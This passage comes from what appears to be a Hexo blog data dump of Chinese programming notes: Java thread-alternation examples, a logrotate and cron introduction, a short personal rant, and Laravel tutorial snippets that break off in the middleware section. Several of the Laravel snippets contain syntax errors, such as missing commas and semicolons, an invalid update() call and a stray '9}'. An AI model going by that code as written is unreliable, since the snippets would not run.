&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>) &#123;<span class=\"comment\">// 如果count==0,表示这是最后一次打印操作，通过notifyAll操作释放对象锁。</span></span><br><span class=\"line\">                            prev.notifyAll();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            prev.wait(); <span class=\"comment\">// 立即释放 prev锁，当前线程休眠，等待唤醒</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Object a = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        Object b = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        Object c = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        ThreadPrinter pa = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"A\"</span>, c, a);</span><br><span class=\"line\">        ThreadPrinter pb = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"B\"</span>, a, b);</span><br><span class=\"line\">        ThreadPrinter pc = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"C\"</span>, b, c);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pa).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);<span class=\"comment\">// 保证初始ABC的启动顺序</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pb).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pc).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由交替打印代码可以得出<code>wait()</code>和<code>notify()</code>的区别</p>\n<ul>\n<li>wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。</li>\n<li>当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。</li>\n<li>当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。</li>\n</ul>\n<p><strong><code>notify/notifyAll()</code>执行后，并不立即释放锁，而是要等到执行完临界区中代码后，再释放。</strong></p>\n<h4 id=\"lock方式\"><a href=\"#lock方式\" class=\"headerlink\" title=\"lock方式\"></a>lock方式</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.locks.Lock;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ABC_Lock</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Lock lock = <span class=\"keyword\">new</span> ReentrantLock();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> state = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadA</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"A\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();\t<span class=\"comment\">// 必须放在finally中</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadB</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"B\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadC</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"C\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadA().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadB().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadC().start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"synchronized-和-lock的区别\"><a href=\"#synchronized-和-lock的区别\" class=\"headerlink\" title=\"synchronized 和 lock的区别\"></a>synchronized 和 lock的区别</h4><ul>\n<li><code>synchronized</code> : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。</li>\n<li><code>lock(ReentrantLock)</code> : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。</li>\n</ul>\n<p>我们写同步的时候，优先考虑synchronized，如果有特殊需要，再进一步优化。ReentrantLock如果用的不好，不仅不能提高性能，还可能带来灾难。</p>"},{"title":"logrotate","date":"2017-06-14T07:18:23.000Z","_content":"\n## logrotate介绍\n**对于Linux系统安全来说，日志文件是及其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档和查询。**\n<!--more-->\n**所以便有了使用logrotate的时候，logrotate是十分有用的工具，它可以自动对日志进行截断、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log里的日志文件没30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何一步的人为干预。**\n\n## logrotate配置文件位置\n**Linux系统默认安装logrotate工具，它默认的配置文件在:**\n`/etc/logrotate.conf`\n`/etc/logrotate.d/`\n\n## 定时轮循机制\n- **`/etc/cron.daily/logrotate`中定义了每天定时执行的任务**\n- **`/etc/cron.weekly/logrotate`中定义了每个星期定时执行的任务**\n- **`/etc/cron.hourly/logrotate`中定义了每小时定时执行的任务**\n- **`/etc/cron.monthly/logrotate`中定义了每个月定时执行的任务**\n\n**`/etc/crontab`规定了轮循的时间**\n![crontab](/images/crontab.png)\n\n- **`/etc/cron.daily/`下面的任务都是每天6:25执行**\n- **`/etc/cron.weekly/`下面的任务都是每周日6:47执行**\n- **`/etc/cron.monthly/`下面的任务都是每月1号6:52执行**","source":"_posts/logrotate.md","raw":"---\ntitle: logrotate\ntags: logrotate\ndate: 2017-06-14 15:18:23\ncategories: linux\n---\n\n## logrotate介绍\n**对于Linux系统安全来说，日志文件是及其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档和查询。**\n<!--more-->\n**所以便有了使用logrotate的时候，logrotate是十分有用的工具，它可以自动对日志进行截断、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log里的日志文件没30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何一步的人为干预。**\n\n## logrotate配置文件位置\n**Linux系统默认安装logrotate工具，它默认的配置文件在:**\n`/etc/logrotate.conf`\n`/etc/logrotate.d/`\n\n## 定时轮循机制\n- **`/etc/cron.daily/logrotate`中定义了每天定时执行的任务**\n- **`/etc/cron.weekly/logrotate`中定义了每个星期定时执行的任务**\n- **`/etc/cron.hourly/logrotate`中定义了每小时定时执行的任务**\n- **`/etc/cron.monthly/logrotate`中定义了每个月定时执行的任务**\n\n**`/etc/crontab`规定了轮循的时间**\n![crontab](/images/crontab.png)\n\n- **`/etc/cron.daily/`下面的任务都是每天6:25执行**\n- **`/etc/cron.weekly/`下面的任务都是每周日6:47执行**\n- **`/etc/cron.monthly/`下面的任务都是每月1号6:52执行**","slug":"logrotate","published":1,"updated":"2017-11-28T03:08:34.573Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscza002cyp0l7n5kqufc","content":"<h2 id=\"logrotate介绍\"><a href=\"#logrotate介绍\" class=\"headerlink\" title=\"logrotate介绍\"></a>logrotate介绍</h2><p><strong>对于Linux系统安全来说，日志文件是及其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档和查询。</strong><br><a id=\"more\"></a><br><strong>所以便有了使用logrotate的时候，logrotate是十分有用的工具，它可以自动对日志进行截断、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log里的日志文件没30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何一步的人为干预。</strong></p>\n<h2 id=\"logrotate配置文件位置\"><a href=\"#logrotate配置文件位置\" class=\"headerlink\" title=\"logrotate配置文件位置\"></a>logrotate配置文件位置</h2><p><strong>Linux系统默认安装logrotate工具，它默认的配置文件在:</strong><br><code>/etc/logrotate.conf</code><br><code>/etc/logrotate.d/</code></p>\n<h2 id=\"定时轮循机制\"><a href=\"#定时轮循机制\" class=\"headerlink\" title=\"定时轮循机制\"></a>定时轮循机制</h2><ul>\n<li><strong><code>/etc/cron.daily/logrotate</code>中定义了每天定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.weekly/logrotate</code>中定义了每个星期定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.hourly/logrotate</code>中定义了每小时定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.monthly/logrotate</code>中定义了每个月定时执行的任务</strong></li>\n</ul>\n<p><strong><code>/etc/crontab</code>规定了轮循的时间</strong><br><img src=\"/images/crontab.png\" alt=\"crontab\"></p>\n<ul>\n<li><strong><code>/etc/cron.daily/</code>下面的任务都是每天6:25执行</strong></li>\n<li><strong><code>/etc/cron.weekly/</code>下面的任务都是每周日6:47执行</strong></li>\n<li><strong><code>/etc/cron.monthly/</code>下面的任务都是每月1号6:52执行</strong></li>\n</ul>\n","excerpt":"<h2 id=\"logrotate介绍\"><a href=\"#logrotate介绍\" class=\"headerlink\" title=\"logrotate介绍\"></a>logrotate介绍</h2><p><strong>对于Linux系统安全来说，日志文件是及其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档和查询。</strong><br>","more":"<br><strong>所以便有了使用logrotate的时候，logrotate是十分有用的工具，它可以自动对日志进行截断、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log里的日志文件没30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何一步的人为干预。</strong></p>\n<h2 id=\"logrotate配置文件位置\"><a href=\"#logrotate配置文件位置\" class=\"headerlink\" title=\"logrotate配置文件位置\"></a>logrotate配置文件位置</h2><p><strong>Linux系统默认安装logrotate工具，它默认的配置文件在:</strong><br><code>/etc/logrotate.conf</code><br><code>/etc/logrotate.d/</code></p>\n<h2 id=\"定时轮循机制\"><a href=\"#定时轮循机制\" class=\"headerlink\" title=\"定时轮循机制\"></a>定时轮循机制</h2><ul>\n<li><strong><code>/etc/cron.daily/logrotate</code>中定义了每天定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.weekly/logrotate</code>中定义了每个星期定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.hourly/logrotate</code>中定义了每小时定时执行的任务</strong></li>\n<li><strong><code>/etc/cron.monthly/logrotate</code>中定义了每个月定时执行的任务</strong></li>\n</ul>\n<p><strong><code>/etc/crontab</code>规定了轮循的时间</strong><br><img src=\"/images/crontab.png\" alt=\"crontab\"></p>\n<ul>\n<li><strong><code>/etc/cron.daily/</code>下面的任务都是每天6:25执行</strong></li>\n<li><strong><code>/etc/cron.weekly/</code>下面的任务都是每周日6:47执行</strong></li>\n<li><strong><code>/etc/cron.monthly/</code>下面的任务都是每月1号6:52执行</strong></li>\n</ul>"},{"title":"吐槽","date":"2016-05-21T07:18:23.000Z","_content":"我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。","source":"_posts/my-note1.md","raw":"---\ntitle: 吐槽\ndate: 2016-05-21 15:18:23\n---\n我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。","slug":"my-note1","published":1,"updated":"2017-11-21T09:16:08.533Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczf002fyp0lixbec4qv","content":"<p>我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。</p>\n","excerpt":"","more":"<p>我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。</p>\n"},{"title":"laravel学习之旅","date":"2017-07-30T07:18:23.000Z","_content":"\n## 路由\n**1.基本路由**\n``` php\nRoute::get('basic1', function () {\n    return 'Hello World';\n});\n```\n\n**2.路由参数**\n``` php\nRoute::get('user/{id}', function ($id) {\n    return 'User-id-' . $id;\n})->where('id', '[0-9]+');\n\nRoute::get('user/{name?}', function ($name = 'fenlan') {\n    return 'User-name-' . $name;\n})->where('name', '[A-Za-z]+');\n```\n<!--more-->\n**3.路由群组**\n``` php\nRoute::group(['prefix' => 'member'], function () {\n    Route::get('user/member-center', ['as' => 'center', function () {\n        return route('center');\n    }]);\n    Route::any('multy1', function () {\n        return 'member-multy1';\n    });\n});\n```\n\n**4.控制器关联**\n``` php\nRoute::get('member/{id}', 'MemberController@info');\n```\n> get参数中第一个是url路由，第二个是控制器MemberController及控制器中函数info\n\n## 控制器\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nclass MemberController extends Controller\n{\n    public function info($id) {\n        //return 'member-info-id-' . $id;\n        //return view('welcome');\n        return view('info', [\n            'name' => 'fenlan',\n            'age' => 18,\n            'sex' => 'male'\n        ]);\n    }\n}\n```\n\n## 视图\n``` php\ninfo blade php\n{{$name}}\n{{$age}}\n{{$sex}}\n```\n**laravel新建视图完成后需要模块编译(我是这么理解的)**\n``` php\nphp artisan serve\n```\n\n## 连接数据库\n**在.env文件中修改配置**\n``` bash\nAPP_NAME=Laravel\nAPP_ENV=local\nAPP_KEY=\nAPP_DEBUG=true\nAPP_LOG_LEVEL=debug\nAPP_URL=http://localhost\n\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=homestead\nDB_USERNAME=homestead\nDB_PASSWORD=secret\n\nBROADCAST_DRIVER=log\nCACHE_DRIVER=file\nSESSION_DRIVER=file\nQUEUE_DRIVER=sync\n\nREDIS_HOST=127.0.0.1\nREDIS_PASSWORD=null\nREDIS_PORT=6379\n\nMAIL_DRIVER=smtp\nMAIL_HOST=smtp.mailtrap.io\nMAIL_PORT=2525\nMAIL_USERNAME=null\nMAIL_PASSWORD=null\nMAIL_ENCRYPTION=null\n\nPUSHER_APP_ID=\nPUSHER_APP_KEY=\nPUSHER_APP_SECRET=\n```\n**修改完成后再编译一下，就连接成功**\n\n## 数据库操作\n**1.使用DB facade实现CURD**\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Support\\Facades\\DB;\n\nclass StudentController extends Controller\n{\n    public function test1() {\n        $student = DB::select('SELECT * FROM student');\n        dd($student);\n        // $bool = DB::insert('INSERT INTO student(name, ID) VALUES(?, ?)', ['fenlan', '15130110067']);\n        // $num = DB::update('UPDATE student SET in_time = ? WHERE ID = ?', ['2015', '15130110067']);\n        // $num = DB::delete('DELETE FROM student WHERE id > ?', ['15130110067']);\n    }\n}\n```\n**这种方法属于原始方法，接下来有更酷的操作数据库方法**\n\n**2.查询构造器及新增数据**\n``` php\npublic function test2() {\n        $bool = DB::table('student')->insert([\n            ['ID' => '15130110098', 'name' => '小淳', 'sex' => 'female', 'class' => '1513011',\n            'in_time' => '2015', 'status' => 'stay_in']\n            ['ID' => '15130110099', 'name' => '小明', 'sex' => 'female', 'class' => '1513011',\n            'in_time' => '2015', 'status' => 'stay_in']\n        ]);\n        var_dump($bool);\n\n        $num = DB::table('student')->where('id', '15130110067')->update('in_time' => '2016');\n        var_dump($num);\n        $num DB::table('student')->increment('class', 1);\n        var_dump($num);\n        $num = DB::table('student')->where('id', '>=', '15130110067')->delete();\n        var_dump($num);\n        DB::table('student')->truncate();   // delete all data in table\n\n        $students = DB::table('student')->get();     // return all data\n        dd($students);\n        $student = DB::table('student')->orderBy('id', 'desc')->first();\n        dd($student);\n        $names = DB::table('student')->pluck('name');    // return name attrubite\n        dd($names);\n        $names = DB::table('student')->lists('name', 'id');  // return id -> name(now this is removed)\n        dd($names);\n        $names = DB::table('student')->select('id', 'name', 'sex')->get();   // return attrubites\n        dd($names);\n        echo '<pre>';\n        DB::table('student')->chunk(2, function($students) {\n            var_dump($students);\n        });     // for big data query, query 2 data every time\n    }\n```\n**这个方法可以避免sql攻击注入，同时也人性化很多,还有很多内容，具体查看官方文档**\n[database](https://laravel.com/docs/5.4/queries)\n\n**3.Eloquent ORM**\n``` php\n<?php\n// app\\Student.php\nnamespace App;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Flight extends Model\n{\n    /**\n     * The table associated with the model.\n     *\n     * @var string\n     */\n    protected $table = 'student';\n    protected $primaryKey = 'id';\n}\n```\n``` php\n// app\\Http\\Controllers\\StudentController.php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Student;\n\nclass StudentController extends Controller\n{\n    public function test() {\n        $students = Student::all();\n        $students = Student::find('15130110067')\n        dd($students);\n\n        $student = new Student();\n        $student->ID = '15130110070';\n        $student->name = '小青';\n        $student->sex = 'female';\n        $student->class = '1513011';\n        $student->in_time = '2015';\n        $student->status = 'stay_in';\n        $bool = $student->save();\n        dd($bool);\n    }\n}\n```\n``` php\n// ORM 正则搜索\npublic function search(Request $request) {\n\n    $keyword = $request->keyword;\n    $keyword = '%' . $keyword . '%';\n\n    // $books = DB::select('SELECT * FROM books WHERE keywords LIKE ?', [$keyword]);\n    $books = Book::where('keywords', 'LIKE', $keyword)->paginate(12);\n    if ($books->total()) {\n\n        return view('book.searchResults', [\n            'books' => $books,\n        ]);\n    } else {\n\n        return view('book.searchNoFound');\n    }\n}\n```\n**具体内容查看官方文档**\n[ORM](https://laravel.com/docs/5.4/eloquent)\n\n## blade模板\n``` php\n// views\\layout.blade.php\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <title>laravel模板继承</title>\n    <style>\n        .header {\n            width: 1000px;\n            height: 150px;\n            margin: 0 auto;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .main {\n            width: 1000px;\n            height: 300px;\n            margin: 0 auto;\n            margin-top: 15px;\n            clear: both;\n        }\n\n        .main .sidebar {\n            float: left;\n            width: 20%;\n            height: inherit;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .main .content {\n            float: right;\n            width: 75%;\n            height: inherit;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .footer {\n            width: 1000px;\n            height: 150px;\n            margin: 0 auto;\n            margin-top: 15px;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n    </style>\n</head>\n<body>\n    <div class='header'>\n        @section('header')\n        头部\n        @show\n    </div>\n\n    <div class='main'>\n        <div class='sidebar'>\n            @section('sidebar')\n            侧边栏\n            @show\n        </div>\n        <div class='content'>\n            @yield('content', '主要内容')\n        </div>\n    </div>\n\n    <div class=\"footer\">\n        @section('footer')\n        尾部\n        @show\n    </div>\n\n</body>\n</html>\n```\n``` php\n// views\\student\\test.php\n@extends('layout')\n\n@section('header')\n    @parent\n    header\n@stop\n\n@section('sidebar')\n    sidebar\n@stop\n\n@section('content')\n    content\n\n    <!-- 1.模板中输出变量 -->\n    <p>{{ $name }}</p>\n\n    <!-- 2.模板中调用PHP代码 -->\n    <p>{{ time() }}</p>\n    <p>{{ date('Y-m-d H:i:s', time()) }}</p>\n\n    <!-- 3.原样输出 -->\n    <p>@{{ $name }}</p>\n\n    {{-- 4.模板中注释 --}}\n\n    {{-- 5.引入子视图 --}}\n    @include('student.commen', ['message' => '我是错误信息'])\n\n    @if ($name == 'fenlan')\n        I'm fenlan\n    @elseif ($name == 'hello')\n        I'm hello\n    @else\n        Who am I?\n    @endif\n\n    <br>\n    @unless ($name != 'fenlan')\n        I'm fenlan\n    @endunless\n\n    <br>\n    @for ($i=0; $i < 10; $i++)\n        {{ $i }}\n    @endfor\n\n@stop\n```\n\n## Requests\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentController extends Controller\n{\n    public function test(Request $request) {\n        // 1.取值\n        echo $request->input('name', 'default');\n        echo $request->has('name');\n        $res = $request->all();\n        dd($res);\n\n        // 2.判断请求类型\n        echo $request->method();\n        echo $request->isMethod('GET');\n        $res = $request->is('student/*');\n        var_dump($res);\n    }\n}\n```\n\n## Session\n``` php\n// routes\\web.php\nRoute::group(['middleware' => ['web']], function () {\n   Route::any('session1', 'StudentController@session1');\n   Route::any('session2', 'StudentController@session2');\n});\n```\n``` php\n// 1.Http request session();\npublic function session1(Request $request) {\n        $request->session()->put('key1', 'value1');\n    }\n\n    public function session2(Request $request) {\n        echo $request->session()->get('key1');\n    }\n```\n``` php\n// 2.sesson()\npublic function session1(Request $request) {\n        session()->put('key2', 'value2');\n    }\n\n    public function session2(Request $request) {\n        echo session()->get('key2');\n    }\n```\n``` php\n// 3.Session class\n    public function session1(Request $request) {\n        Session::put('key3', 'value3');\n    }\n\n    public function session2(Request $request) {\n        echo session::get('key3', 'default');\n    }\n```\n``` php\npublic function session1(Request $request) {\n        Session::push('student', 'fenlan');\n        Session::push('student', 'shirk3');\n    }\n\n    public function session2(Request $request) {\n        $res = Session::get('student', 'default');\n        dd($res);\n    }\n```\n``` php\npublic function session1(Request $request) {\n        Session::forget('student');\n        Session::flush('key', 'default');\t// temporary\n        Session::flush();\n    }\n\n    public function session2(Request $request) {\n    \techo Session::has('student');\t\t// return bool\n        $res = Session::pull('student', 'default');\n        dd($res);\n    }\n```\n\n## Response\n``` php\npublic function test() {\n        // 响应json\n        $data = [\n          'errCode' => 0,\n          'errMsg' => 'success',\n          'data' => 'fenlan',\n        ];\n\n        return response()->json($data);\n}\n```\n``` php\npublic function test() {\n        // redirect\n        return redirect('session2');\n9}\n```\n\n## Middleware\n**目的：实现一个功能，当访问时间小于活动开始时间，则跳转到宣传页面，当访问时间大于活动开始时间，则跳转到活动界面**\n**1.宣传页面和活动页面构造**\n``` php\n// app\\Http\\Controller\\StudentController.php\n    // 宣传页面\n    public function activity0() {\n\n        return '活动快要开始啦，敬请关注';\n    }\n\n    // 活动页面\n    public function activity1() {\n\n        return '活动进行中，谢谢您的参与1';\n    }\n\n    // 活动页面\n    public function activity2() {\n\n        return '活动进行中，谢谢您的参与2';\n    }\n```\n**2.添加Middleware**\n``` php\n// app\\Http\\Middleware\\Activity.php\n<?php\n\nnamespace App\\Http\\Middleware;\n\nuse Closure;\n\nclass Activity\n{\n\n    public function handle($request, Closure $next) {\n\n        if (time() < strtotime('2017-08-03')) 